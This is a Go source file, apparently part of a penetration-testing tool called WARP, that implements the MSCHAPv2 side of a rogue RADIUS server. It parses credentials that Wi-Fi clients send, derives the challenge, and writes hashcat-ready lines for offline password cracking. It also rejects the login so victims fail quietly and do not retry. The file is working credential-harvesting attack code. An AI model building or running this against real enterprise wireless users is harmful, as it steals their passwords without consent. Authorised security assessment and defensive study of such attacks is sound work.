// Package method implements the EAP method state machines WARP's RADIUS server speaks.
//
// The credential material these produce is carried to a separate cracking rig, so the same
// rule applies here as to the 22000 files: a format error is invisible on the engagement box
// and only surfaces hours later when the hashes fail to crack, with no chance to recapture.
package method

import (
	"crypto/sha1"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"strings"
	"unicode/utf16"

	"golang.org/x/crypto/md4" //nolint:staticcheck // MD4 is what NT password hashing specifies
)

// MSCHAPv2 field sizes (RFC 2759).
const (
	AuthenticatorChallengeLen = 16
	PeerChallengeLen          = 16
	NTResponseLen             = 24
	// DerivedChallengeLen is the 8-byte challenge hashcat expects, not the 16-byte
	// authenticator challenge seen on the wire.
	DerivedChallengeLen = 8
)

// MSCHAPv2 opcodes.
const (
	OpChallenge      = 1
	OpResponse       = 2
	OpSuccess        = 3
	OpFailure        = 4
	OpChangePassword = 7
)

// Credential is one captured MSCHAPv2 exchange.
type Credential struct {
	// Username as sent inside the MSCHAPv2 exchange. This is the *inner* identity.
	Username string
	// AuthenticatorChallenge is the 16-byte challenge WARP issued.
	AuthenticatorChallenge [AuthenticatorChallengeLen]byte
	// PeerChallenge is the 16-byte challenge the supplicant chose.
	PeerChallenge [PeerChallengeLen]byte
	// NTResponse is the 24-byte response.
	NTResponse [NTResponseLen]byte
}

// ChallengeHash derives the 8-byte challenge from the two 16-byte challenges and the
// username, per RFC 2759 section 8.2.
//
//	challenge = SHA1(PeerChallenge || AuthenticatorChallenge || UserName)[0:8]
//
// This derivation is the single most expensive thing to get wrong in the whole EAP module.
// Emitting the raw 16-byte authenticator challenge instead produces a hash line that hashcat
// accepts without complaint and can never crack, and nobody finds out until the cracking rig
// has already run.
//
// The username is hashed as the bytes that appeared on the wire, with any domain prefix
// stripped exactly as RFC 2759 specifies - the peer hashes the bare account name.
func ChallengeHash(peer [PeerChallengeLen]byte, authenticator [AuthenticatorChallengeLen]byte, username string) [DerivedChallengeLen]byte {
	h := sha1.New()
	h.Write(peer[:])
	h.Write(authenticator[:])
	h.Write([]byte(stripDomain(username)))

	var out [DerivedChallengeLen]byte
	copy(out[:], h.Sum(nil)[:DerivedChallengeLen])
	return out
}

// stripDomain removes a DOMAIN\ prefix.
//
// RFC 2759 hashes the bare account name, so "CORP\alice" contributes "alice". Hashing the
// qualified form yields a challenge that will not crack.
func stripDomain(username string) string {
	if i := strings.LastIndex(username, `\`); i >= 0 {
		return username[i+1:]
	}
	return username
}

// HashcatLine renders the credential as a hashcat -m 5500 line.
//
//	username::::response:challenge
//
// response is the 24-byte NT response and challenge is the 8-byte *derived* challenge.
func (c Credential) HashcatLine() (string, error) {
	if c.Username == "" {
		return "", errors.New("method: refusing to emit a credential with no username")
	}
	if allZero(c.NTResponse[:]) {
		return "", errors.New("method: refusing to emit a zero NT response")
	}
	if strings.ContainsAny(c.Username, ":\n\r") {
		// The separator is a colon, so a username containing one would silently corrupt the
		// line and every field after it.
		return "", fmt.Errorf("method: username %q contains a field separator", c.Username)
	}

	challenge := ChallengeHash(c.PeerChallenge, c.AuthenticatorChallenge, c.Username)

	return fmt.Sprintf("%s::::%s:%s",
		c.Username,
		hex.EncodeToString(c.NTResponse[:]),
		hex.EncodeToString(challenge[:]),
	), nil
}

// ParseChallenge decodes an MSCHAPv2 Challenge packet body (after the opcode).
//
// Layout: identifier(1) length(2) value-size(1) challenge(16) name(...)
func ParseChallenge(b []byte) (id byte, challenge [AuthenticatorChallengeLen]byte, name string, err error) {
	if len(b) < 5 {
		return 0, challenge, "", fmt.Errorf("method: MSCHAPv2 challenge is %d bytes, too short", len(b))
	}
	id = b[0]
	valueSize := int(b[3])
	if valueSize != AuthenticatorChallengeLen {
		return 0, challenge, "", fmt.Errorf("method: MSCHAPv2 challenge value size is %d, want %d",
			valueSize, AuthenticatorChallengeLen)
	}
	if len(b) < 4+valueSize {
		return 0, challenge, "", errors.New("method: MSCHAPv2 challenge truncated")
	}
	copy(challenge[:], b[4:4+valueSize])
	return id, challenge, string(b[4+valueSize:]), nil
}

// ParseResponse decodes an MSCHAPv2 Response packet body (after the opcode).
//
// Layout: identifier(1) length(2) value-size(1) peer-challenge(16) reserved(8)
// nt-response(24) flags(1) name(...)
func ParseResponse(b []byte) (Credential, error) {
	const (
		reservedLen = 8
		flagsLen    = 1
		valueLen    = PeerChallengeLen + reservedLen + NTResponseLen + flagsLen // 49
	)

	var c Credential
	if len(b) < 4 {
		return c, fmt.Errorf("method: MSCHAPv2 response is %d bytes, too short", len(b))
	}

	valueSize := int(b[3])
	if valueSize != valueLen {
		return c, fmt.Errorf("method: MSCHAPv2 response value size is %d, want %d", valueSize, valueLen)
	}
	if len(b) < 4+valueSize {
		return c, errors.New("method: MSCHAPv2 response truncated")
	}

	off := 4
	copy(c.PeerChallenge[:], b[off:off+PeerChallengeLen])
	off += PeerChallengeLen + reservedLen
	copy(c.NTResponse[:], b[off:off+NTResponseLen])
	off += NTResponseLen + flagsLen

	c.Username = string(b[off:])
	return c, nil
}

// BuildChallenge assembles an MSCHAPv2 Challenge packet.
func BuildChallenge(id byte, challenge [AuthenticatorChallengeLen]byte, name string) []byte {
	body := make([]byte, 0, 4+AuthenticatorChallengeLen+len(name))
	body = append(body, OpChallenge, id)
	body = append(body, 0, 0) // length, filled below
	body = append(body, AuthenticatorChallengeLen)
	body = append(body, challenge[:]...)
	body = append(body, name...)

	binary.BigEndian.PutUint16(body[2:4], uint16(len(body)))
	return body
}

// BuildFailure assembles an MSCHAPv2 Failure packet.
//
// Access-Reject is the default outcome: WARP captures the credential and then refuses the
// authentication, so the supplicant sees a failed login rather than being placed on a network
// it should not be on.
func BuildFailure(id byte, message string) []byte {
	if message == "" {
		// E=691 is "authentication failure", R=0 means do not retry. Chosen so the client
		// gives up cleanly rather than retrying in a loop and generating noise.
		message = "E=691 R=0 C=00000000000000000000000000000000 V=3 M=Authentication failure"
	}
	body := make([]byte, 0, 4+len(message))
	body = append(body, OpFailure, id)
	body = append(body, 0, 0)
	body = append(body, message...)

	binary.BigEndian.PutUint16(body[2:4], uint16(len(body)))
	return body
}

// ---------------------------------------------------------------------------
// Response computation - used only by tests and by the optional accept path
// ---------------------------------------------------------------------------

// NTPasswordHash is MD4 of the password encoded as UTF-16LE (RFC 2759 section 8.3).
func NTPasswordHash(password string) [16]byte {
	units := utf16.Encode([]rune(password))
	buf := make([]byte, 0, len(units)*2)
	for _, u := range units {
		buf = binary.LittleEndian.AppendUint16(buf, u)
	}

	h := md4.New()
	h.Write(buf)

	var out [16]byte
	copy(out[:], h.Sum(nil))
	return out
}

// GenerateNTResponse computes the 24-byte NT response (RFC 2759 section 8.1).
//
// WARP never needs this to capture a credential - it only needs to record what the supplicant
// sent. It exists so the round-trip test can build a response from a known password and
// confirm the emitted hash line actually cracks, which is the only meaningful proof that the
// challenge derivation is right.
func GenerateNTResponse(authenticator [AuthenticatorChallengeLen]byte, peer [PeerChallengeLen]byte, username, password string) [NTResponseLen]byte {
	challenge := ChallengeHash(peer, authenticator, username)
	hash := NTPasswordHash(password)
	return challengeResponse(challenge, hash)
}

// challengeResponse runs the three-DES-key operation from RFC 2759 section 8.5.
func challengeResponse(challenge [DerivedChallengeLen]byte, passwordHash [16]byte) [NTResponseLen]byte {
	// The 16-byte hash is zero-padded to 21 bytes and split into three 7-byte DES keys.
	var zpassword [21]byte
	copy(zpassword[:], passwordHash[:])

	var out [NTResponseLen]byte
	for i := 0; i < 3; i++ {
		key := desKeyFromBytes(zpassword[i*7 : i*7+7])
		block := desEncryptECB(key, challenge[:])
		copy(out[i*8:], block)
	}
	return out
}

func allZero(b []byte) bool {
	for _, v := range b {
		if v != 0 {
			return false
		}
	}
	return true
}
